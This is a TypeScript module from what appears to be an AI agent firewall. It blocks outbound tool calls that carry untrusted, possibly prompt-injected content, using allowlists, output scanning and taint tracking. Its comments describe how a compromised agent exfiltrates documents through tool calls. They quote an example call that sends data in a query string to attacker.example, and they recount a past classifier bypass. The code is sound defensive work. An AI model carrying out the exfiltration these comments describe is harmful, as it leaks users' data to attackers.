import type { ToolCallCheck, ToolCallResult } from "../types.ts";
import { checkTaint } from "./taint.ts";
import { scanOutput } from "./output.ts";

/**
 * Tool-call guard — the enforcement point for outbound actions.
 *
 * A tool call is where a compromised agent does its damage: sends the email, fetches
 * the attacker's URL, writes the file. Unlike output scanning this runs *before*
 * execution, so it can prevent rather than merely report.
 */

/**
 * Tool names known to move data out. Kept only so a block can say *why* with
 * confidence; it is no longer what decides whether the taint check runs.
 *
 * It used to be, and that was a bypass. The list was anchored (`/^(...)/`) and
 * everything it did not match was assumed read-only, so a document the scanner had
 * just blocked at 0.95 went out verbatim through `notify_team_via_email`,
 * `slack_post`, `sync_to_cloud` or `relay_message` — all names real MCP servers use.
 * The anchor made it worse still: `post` matched `post_message` but not
 * `slack_post_message`, so a vendor namespace was enough to skip the check. Measured
 * against 30 real MCP egress tools, 25 were never taint-checked at all.
 */
const KNOWN_EGRESS_TOOLS =
  /\b(send_email|fetch_url|http_request|post|upload|webhook|curl|share|publish|send_message|create_issue|write_file)\b/i;

/**
 * Positive evidence that a tool only reads or computes. A firewall cannot enumerate
 * every tool that sends data — new MCP servers invent names weekly — but the verbs
 * that mean "retrieve" or "work this out locally" are a small, stable set. So the
 * default is now egress, and a tool has to earn its exemption by matching here.
 *
 * `fetch`, `download` and `open_url` are deliberately absent: retrieving a URL is
 * reading to the agent but writing to whoever owns the URL, and the query string is
 * the oldest exfiltration channel there is.
 */
const READ_ONLY_WORDS = new Set([
  // retrieval
  "get", "read", "list", "search", "find", "query", "lookup", "describe", "show",
  "view", "inspect", "browse", "open", "load", "head", "tail", "peek", "preview",
  "count", "exists", "has", "stat", "diff", "log", "logs", "resolve", "check",
  // local computation — no destination, so no way out
  "summarize", "summarise", "analyze", "analyse", "translate", "classify",
  "extract", "parse", "format", "convert", "calculate", "compute", "compare",
  "validate", "verify", "explain", "tokenize", "think", "thinking", "thought",
  "reason", "plan",
  // nouns that only name a thing being read, for the verbless names MCP servers
  // also produce (`directory_tree`, `puppeteer_screenshot`)
  "info", "tree", "schema", "metadata", "details", "history", "profile", "graph",
  "nodes", "status", "contents", "snapshot", "screenshot", "summary", "tables",
  "columns", "directories",
]);

/**
 * Words that put a tool on the egress side outright. Unknown names land there
 * anyway, so this set exists for ordering, not for coverage: the first recognised
 * word in the name decides the class (see `classifyTool`).
 *
 * Note what is NOT here: vendor namespaces like `slack` or `gdrive`. Treating those
 * as sinks would have classed `slack_list_channels` as egress.
 */
const EGRESS_WORDS = new Set([
  // verbs that move or persist data
  "send", "post", "publish", "share", "upload", "push", "write", "create",
  "update", "delete", "remove", "insert", "append", "edit", "modify", "patch",
  "put", "commit", "sync", "notify", "relay", "forward", "transmit", "deliver",
  "emit", "dispatch", "broadcast", "submit", "reply", "comment", "move", "rename",
  "copy", "add", "set", "apply", "merge", "fork", "trigger", "schedule", "export",
  // verbs that hand control to something else, which can then send anything
  "call", "invoke", "exec", "execute", "eval", "evaluate", "run", "navigate",
  "fill", "click", "type", "fetch", "download",
  // nouns that name a sink
  "email", "mail", "message", "webhook", "http", "https", "request", "sms",
  "notification", "url", "uri", "curl",
]);

/** Extra tool names an operator vouches for as read-only, comma-separated. The
 *  default-egress rule is deliberately strict, and a verbless in-house tool name
 *  that carries document text would otherwise need a code change to exempt. */
const OPERATOR_READ_ONLY = new Set(
  (process.env.WARDEN_READONLY_TOOLS ?? "")
    .split(",")
    .map((t) => t.trim().toLowerCase())
    .filter(Boolean)
);

/** Argument names whose value is a destination rather than content. */
const DESTINATION_KEY =
  /^(url|uri|href|link|endpoint|to|cc|bcc|recipient|recipients|dest|destination|target|webhook|callback|remote|upload_?url)$/i;

/** A value that names somewhere data can be sent. */
const DESTINATION_VALUE = /https?:\/\/\S+|[\w.+-]+@[\w-]+\.[\w.-]+/;

/** Proportion of a tool argument that may come from untrusted content before it is
 *  treated as carrying that content outward. Set above zero because short quoted
 *  fragments are legitimate — summarising a document is the agent's job. */
const TAINT_RATIO_LIMIT = Number(process.env.WARDEN_TAINT_RATIO ?? 0.35);

/**
 * How many ordinary proper nouns from tainted content an outbound call may mention.
 *
 * Measured, not guessed. At two, a legitimate "Priya will join the Brighton review"
 * blocked — both names appeared in the poisoned document, and an agent that read a
 * document about a colleague is going to mention that colleague. At three, that call
 * passes and nothing on the evasion probe survives: every restatement that entity
 * matching catches is caught by a *strong* literal (the passphrase, the account
 * number), never by proper nouns alone. So the higher bar costs no detection and
 * removes the one false block in ten legitimate messages.
 */
const WEAK_ENTITY_LIMIT = 3;

/**
 * Words of a tool name. MCP servers namespace with underscores, dashes and dots
 * (`slack_post_message`, `maps.geocode`) and some use camelCase (`sendEmail`), so
 * both have to split or the name is one opaque token.
 */
function toolWords(tool: string): string[] {
  return tool
    .replace(/([a-z0-9])([A-Z])/g, "$1 $2")
    .split(/[^A-Za-z0-9]+/)
    .map((w) => w.toLowerCase())
    .filter(Boolean);
}

/**
 * Read-only or egress, from the name alone.
 *
 * The *first* recognised word decides, because MCP tool names are verb-first after
 * an optional vendor namespace. Letting any egress word anywhere win instead would
 * class `search_messages` and `get_commit` as egress on their object rather than
 * their verb, which blocks ordinary reads in Gmail- and git-shaped servers.
 */
function classifyTool(tool: string): "read-only" | "egress" {
  if (OPERATOR_READ_ONLY.has(tool.toLowerCase())) return "read-only";

  const words = toolWords(tool);
  for (const w of words) {
    if (EGRESS_WORDS.has(w)) return "egress";
    if (READ_ONLY_WORDS.has(w)) return "read-only";
  }

  // A name with no separators at all (`sequentialthinking`) has no words to walk,
  // so fall back to a prefix/suffix match. Only indicators of five characters or
  // more, or `get` would match `set_budget` and `target_user`.
  if (words.length === 1) {
    const name = words[0];
    const longEnough = (s: string) => s.length >= 5;
    for (const w of EGRESS_WORDS) {
      if (longEnough(w) && (name.startsWith(w) || name.endsWith(w))) return "egress";
    }
    for (const w of READ_ONLY_WORDS) {
      if (longEnough(w) && (name.startsWith(w) || name.endsWith(w))) return "read-only";
    }
  }

  // The inversion. An unrecognised tool is assumed to be able to send data, because
  // being wrong in that direction costs a blocked call and being wrong in the other
  // direction costs the document.
  return "egress";
}

/**
 * A read-only tool whose arguments carry an actual destination is not read-only.
 *
 * `get_page(url: "https://attacker.example/?d=...")` reads, as far as the agent is
 * concerned, but the query string is already outbound. Only destination-shaped
 * *keys* count: a URL inside a `text` or `body` argument is usually just part of the
 * document being summarised, and escalating on that would block the exemption the
 * README promises — poisoned documents nearly always contain a URL.
 */
function hasDestinationArg(args: Record<string, unknown>): boolean {
  for (const [key, value] of Object.entries(args ?? {})) {
    if (!DESTINATION_KEY.test(key)) continue;
    const text = typeof value === "string" ? value : JSON.stringify(value ?? "");
    if (DESTINATION_VALUE.test(text)) return true;
  }
  return false;
}

function argsToText(args: Record<string, unknown>): string {
  return Object.values(args)
    .map((v) => (typeof v === "string" ? v : JSON.stringify(v ?? "")))
    .join("\n");
}

export function checkToolCall(req: ToolCallCheck & { allowedTools?: string[] }): ToolCallResult {
  const { tool, args, sessionId } = req;
  const text = argsToText(args ?? {});
  const blockedArgs: string[] = [];

  // 1. Allowlist. An empty list means unrestricted — policy decides, not this module.
  if (req.allowedTools?.length && !req.allowedTools.includes(tool)) {
    return { allowed: false, reason: `Tool "${tool}" is not in this agent's allowlist`, blockedArgs: [] };
  }

  // 2. Explicit provenance from the caller, when it tracks its own.
  for (const [key, provenance] of Object.entries(req.argProvenance ?? {})) {
    if (provenance === "tainted") blockedArgs.push(key);
  }

  const klass = classifyTool(tool);
  const isEgress = klass === "egress" || hasDestinationArg(args ?? {});

  // 3. Secrets and exfiltration URLs in the arguments. Checked for every tool,
  //    since a credential in a file write is as bad as one in an email.
  const outbound = scanOutput({ content: text });
  if (outbound.riskScore >= 0.8) {
    const reasons = outbound.findings.map((f) => f.reason).join("; ");
    return {
      allowed: false,
      reason: `Blocked: ${reasons}`,
      blockedArgs: Object.keys(args ?? {}),
    };
  }

  // 4. Taint — for every tool except those with positive evidence of being
  //    read-only. Read-only tools stay exempt because summarising a document the
  //    agent just fetched is the job, not an attack.
  if (isEgress && sessionId) {
    const taint = checkTaint(sessionId, text);

    // Two independent ways to be carrying the document. The shingle ratio catches
    // near-verbatim copies; the entity match catches the restatements that are
    // actually more common — a summary, a bulleted list, a JSON object, a
    // translation — where no 8-word run survives but the passphrase and the account
    // number do. One strong literal is enough on its own; ordinary proper nouns need
    // several, since a shared surname is coincidence rather than evidence.
    const byShingles = taint.ratio > TAINT_RATIO_LIMIT && taint.matched >= 2;
    const byEntities = taint.strongEntities >= 1 || taint.weakEntities >= WEAK_ENTITY_LIMIT;

    if (byShingles || byEntities) {
      // Say which kind of egress it is. An unrecognised name blocked by the default
      // is the case an operator may want to correct with WARDEN_READONLY_TOOLS, and
      // a reason that does not distinguish the two gives them nothing to act on.
      const why = KNOWN_EGRESS_TOOLS.test(tool)
        ? `"${tool}" sends data outward`
        : `"${tool}" is not a recognised read-only tool, so it is treated as able to send data outward`;

      // Describe the signal that actually fired. An entity-only match has a shingle
      // ratio of 0%, and reporting "0% of the arguments come from untrusted content"
      // next to a block would read as a bug in the firewall rather than a finding.
      const evidence = byShingles
        ? `${Math.round(taint.ratio * 100)}% of the arguments to "${tool}" come from untrusted ` +
          `content scanned earlier in this session (${taint.sources.join(", ")})`
        : `the arguments to "${tool}" carry ${taint.strongEntities + taint.weakEntities} distinctive ` +
          `value(s) from untrusted content scanned earlier in this session ` +
          `(${taint.sources.join(", ")}), restated rather than copied`;

      return {
        allowed: false,
        reason:
          `Blocked: ${evidence}, and ${why}. This is the shape of an exfiltration attempt.`,
        blockedArgs: Object.keys(args ?? {}),
      };
    }
  }

  if (blockedArgs.length) {
    return {
      allowed: false,
      reason: `Blocked: arguments marked tainted by the caller: ${blockedArgs.join(", ")}`,
      blockedArgs,
    };
  }

  return {
    allowed: true,
    reason: isEgress ? "Egress tool call cleared" : "No policy violation",
    blockedArgs: [],
  };
}
